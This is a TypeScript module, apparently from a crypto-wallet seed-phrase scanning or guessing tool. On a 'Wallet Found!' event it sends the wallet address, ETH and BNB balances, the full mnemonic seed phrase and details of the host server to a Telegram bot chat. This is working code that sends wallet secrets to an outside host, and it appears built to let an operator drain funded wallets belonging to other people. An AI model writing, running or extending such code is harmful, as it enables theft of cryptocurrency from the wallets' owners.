import os from 'os';
import { env } from './env';
import { Info } from './types';

export async function sendSuccessAlert(info: Info): Promise<boolean> {
  if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
    return false;
  }

  const serverInfo = `${env.SERVER_NAME} (${os.platform()}-${os.arch()}, PID: ${process.pid})`;

  const message = [
    '🚨 *Wallet Found!*',
    `• *Server:* \`${serverInfo}\``,
    `• *Address:* \`${info.address}\``,
    `• *ETH Balance:* ${info.ethBalance} (tx: ${info.ethTxCount})`,
    `• *BNB Balance:* ${info.bnbBalance} (tx: ${info.bnbTxCount})`,
    `• *Mnemonic:*`,
    `\`${info.mnemonic}\``,
  ].join('\n');

  try {
    const url = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`;
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: env.TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    if (!res.ok) {
      const errBody = await res.text();
      console.error('Telegram API error response:', errBody);
      return false;
    }
    return true;
  } catch (err) {
    const errorMsg = err instanceof Error ? err.message : String(err);
    console.error('Failed to send Telegram alert:', errorMsg);
    return false;
  }
}
